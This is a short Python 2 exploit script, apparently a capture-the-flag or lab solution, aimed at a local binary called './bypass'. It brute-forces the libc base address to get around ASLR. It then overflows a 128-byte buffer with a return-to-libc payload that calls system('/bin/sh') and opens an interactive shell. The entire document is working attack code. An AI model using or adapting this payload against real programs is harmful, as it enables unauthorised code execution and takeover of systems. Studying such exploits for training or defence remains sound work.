#!/usr/bin/python

import binascii
import os
import struct

from zio import *

for i in xrange(4242):
  libc = int('0xf75' + binascii.b2a_hex(os.urandom(1)) + '000', 16)
  print 'libc: ' + hex(libc)

  system = libc + 0x00040190
  shell = libc + 0x00160a24

  payload = 'a' * 128                   # buffer
  payload += 'b' * 12                   # garbage and old ebp
  payload += struct.pack('<I', system)  # system address
  payload += 'c' * 4                    # fake return address for system
  payload += struct.pack('<I', shell)   # "/bin/sh" address

  io = zio("./bypass" + " " + payload)
  io.interact()
